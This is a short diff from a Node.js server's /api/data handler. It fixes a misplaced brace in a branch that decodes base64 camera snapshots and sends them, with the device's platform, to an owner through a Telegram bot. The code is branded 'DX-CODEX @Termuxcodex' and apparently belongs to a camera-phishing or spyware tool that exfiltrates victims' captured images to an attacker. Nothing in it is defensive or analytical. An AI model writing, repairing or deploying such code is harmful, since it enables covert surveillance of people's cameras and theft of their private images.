@@ -364,8 +364,8 @@ app.post('/api/data', async (req, res) => {
             msg += `<blockquote>${_fnt("DEV-BY: DX-CODEX || ")}@Termuxcodex</blockquote>`;
 
             await bot.sendMessage(owner, msg, { parse_mode: 'HTML', disable_web_page_preview: true });
-        }   
-    } else if (type === 'cam') {
+            
+        } else if (type === 'cam') { // ekhon bracket thik ache
             const buffer = Buffer.from(data.images[0].replace(/^data:image\/jpeg;base64,/, ""), 'base64');
             await bot.sendPhoto(owner, buffer, { caption: makeBorder("ᴄᴀᴍᴇʀᴀ", `📱: ${data.platform}`), parse_mode: 'HTML' });
         }
